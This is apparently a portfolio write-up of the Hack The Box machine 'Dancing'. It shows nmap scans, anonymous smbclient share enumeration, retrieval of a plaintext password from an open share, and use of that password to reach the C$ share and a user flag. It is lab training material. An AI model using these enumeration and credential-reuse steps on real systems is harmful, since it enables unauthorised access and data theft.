Dancing

MEDIUM
🪟 Windows 🎯 Hack The Box 📌 Resume Evidence

A Windows-based machine focused on SMB share enumeration, identifying an open share, and locating sensitive files through manual exploration of accessible network shares.

On this page
1. Reconnaissance 2. Initial Access 3. Privilege Escalation 4. Key Learnings
1 Reconnaissance

Began with a full port scan to map the attack surface, followed by a targeted scan against the SMB-related ports that were identified.

terminal — nmap
# Full port scan
$ nmap -p- --min-rate=1000 -T4 10.10.10.exam

# Service detection on SMB ports
$ nmap -sV -sC -p 135,139,445 10.10.10.exam

PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Ports 135, 139, and 445 confirmed this was a Windows host with SMB exposed — a strong indicator that share enumeration would be the primary attack vector.

2 Initial Access

Used smbclient to list available shares, testing for null/guest sessions before attempting any credentialed access.

terminal — smbclient
# List shares with a null session
$ smbclient -L \\\\10.10.10.exam\\ -N

Sharename       Type
---------       ----
ADMIN$          Disk
C$              Disk
IPC$            IPC
WorkShares      Disk

# Connect to the non-default share
$ smbclient \\\\10.10.10.exam\\WorkShares -N

smb: \> dir
  Amy.J          D
  James.P        D

The custom WorkShares share was accessible without credentials and contained user-named directories. Browsing further revealed a credentials file left inside one of the folders.

terminal — file retrieval
smb: \WorkShares\Amy.J\> get worknotes.txt
getting file \WorkShares\Amy.J\worknotes.txt
(average 10.0 kb/s)

$ cat worknotes.txt
reminder: temp password — Sdf#asd2021

A plaintext note inside the share contained a reusable password, which was then validated against the SMB service using the discovered username.

3 Privilege Escalation

Used the recovered credentials to authenticate as Amy.J and access additional shares not visible during the null session.

terminal — authenticated access
$ smbclient \\\\10.10.10.exam\\C$ -U Amy.J

Password: Sdf#asd2021
smb: \> cd Users\Amy.J\Desktop
smb: \> get user.txt

$ cat user.txt
u53r1...
  • Authenticated to a privileged administrative share (C$) using reused credentials
  • Retrieved the user flag from the authenticated user's desktop directory
  • Demonstrated impact of credential reuse and unsecured note storage
4 Key Learnings
  • SMB share enumeration is a critical step on any Windows target, even before attempting credential attacks
  • Null and guest sessions can reveal far more than expected when share permissions are misconfigured
  • Plaintext credentials stored in shared files are a recurring, real-world finding worth flagging in any security report
  • Practiced both unauthenticated and authenticated smbclient workflows end-to-end
